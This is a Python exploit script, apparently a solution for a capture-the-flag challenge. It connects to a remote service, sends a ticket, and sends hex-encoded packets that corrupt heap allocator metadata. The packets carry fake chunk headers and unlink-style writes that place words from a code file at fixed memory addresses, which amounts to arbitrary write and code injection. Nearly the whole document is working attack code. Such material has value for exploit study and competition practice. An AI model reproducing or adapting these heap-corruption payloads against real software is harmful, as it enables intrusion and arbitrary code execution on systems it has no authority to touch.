from struct import pack, unpack
from pwnlib import *
from pwnlib.tubes.remote import remote
from binascii import hexlify
import os,sys

wordSize  = 4
buffLen   = 32
headerLen = 2 * wordSize
blockLen  = (buffLen + headerLen + 0x3F) & (~0x3F)

EXIT_TYPE = 5 

def makeWritePayload(addr, val, ii=0):
    startPad  = b"A" * 8
    insidePad = b""
    links     = pack(">II", addr - 0xc, val)
    fakeSize_len = headerLen + len(links) + len(insidePad)
    fakeSizePrev_len = buffLen - fakeSize_len

    prevSizeF = pack(">I", (0<<31) | (fakeSizePrev_len & 0x7FFFFFF))
    fakeSizeF = pack(">I", (1<<31) | (fakeSize_len & 0x7FFFFFF))

    payload   = prevSizeF + fakeSizeF + links
    payload  += fakeSizeF # This is a trick, the prev of the next block looks identical to fake.this
    payload   = startPad + payload
    
    # Len, Offset (in words)
    # Make the payload write to end of the buffer, and overflow by 4
    offset = (4 + blockLen - len(payload) - headerLen)>>2
    offset -= 4 * ii
    payload  = pack("BB", len(payload), offset) + payload
    return pack("BB", len(payload)+2, 6) + payload

def makeCleanupPayload():
    startPad  = b"A" * 8
    insidePad = b"B" * 8  
    links     = b"\x01" * 4 + b"\x02" * 4

    prevSize  = len(startPad) + headerLen
    fakeSize  = blockLen - prevSize
    
    # We want this block to be marked free, this malloc doesn't check for double free
    # We control this block to free the previous block, and make this block the right size
    prevSizeF = pack(">I", ((0<<31) | (prevSize & 0x7FFFFFF)))
    fakeSizeF = pack(">I", ((1<<31) | (0x18 & 0x7FFFFFF)))

    # The important part is that this is marked free
    payload = startPad + prevSizeF + fakeSizeF + links + insidePad
    payload += pack(">I", (0<<31) | 0x40)
    payload += pack(">I", (1<<31) | 0x40)
    payload += b"\x11\x22\x33\x44" * 4
    # Pad from the block all the way to the block we previously overwrote to fix it
    global offset
    payload  = pack("BB", len(payload), offset) + payload
    return pack("BB", len(payload)+2, 6) + payload

def preamble(ID, length):
    return pack(">BBIHH", 8, 1, 0xDEADBEEF, ID, length + 9)


if __name__ == "__main__":
    context.log_level = 'DEBUG'
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", 31355))
    ticket = os.getenv("TICKET", "")

    patches = []
    
    debug = False
    if debug:
        with open("debug.bin", "rb") as f:
            data = f.read()
            patches = [unpack(">I",data[ii:ii+4])[0] for ii in range(0,len(data),4)]
        addrs = [ 0x40001890, 0x40001898 ]
        ii = 0
        payload = b""
        for addr,val in zip(addrs, patches):
            payload += makeWritePayload(addr,val,ii)
            ii += 1
        last = pack(">BBB", 3, 2, 0) # len, type, index
        payload += last
        payload = preamble(1, len(payload)) + payload
        sys.stdout.write( hexlify(payload).decode('utf-8') )
        sys.stdout.write("\n")
    else:
        with open("code.bin", "rb") as f:
            data = f.read()
            patches = [unpack(">I",data[ii:ii+4])[0] for ii in range(0,len(data),4)]
        addrs = [ 0x40002440, 0x40002444 ]
        t = remote(Host, Port)
        if len(ticket):
            print(t.recvline().strip())
            t.send(ticket + "\n")
            print("Sent " + ticket)
            sys.stdout.flush()
        
        print(t.recvline().strip())
        payload = b""
        ii = 0
        for addr, val in zip(addrs,patches):
            payload += makeWritePayload(addr,val,ii)
            ii += 1
        last = pack(">BBB", 3, 2, 0) # len, type, index
        payload += last
        payload = preamble(1, len(payload)) + payload
        t.send(hexlify(payload) + b"\n")

        '''
        for addr, val in zip(addrs,patches):
            wPayload = makeWritePayload(addr,val)
            fixPayload = makeCleanupPayload()
            pre  = preamble(ID, len(wPayload) + len(fixPayload))
            ID += 1
            t.send(hexlify( pre + wPayload + fixPayload ) + b"\n")
            print("Sent Packet")
            print(hexlify( pre + wPayload + fixPayload ))
            sys.stdout.flush()
            while True:
                line = t.recvline().strip()
                print(line)
                sys.stdout.flush()
                if b"ACK" in line or b"Error" in line:
                    break
        last = pack(">BBB", 3, 2, 0)
        last = preamble(ID, len(last)) + last
        t.write( hexlify( last ) )
        t.write("\n")
        '''
        while True:
            line = t.recvline().strip()
            print(line)
            sys.stdout.flush()
            if b"ACK" in line or b"Error" in line:
                break
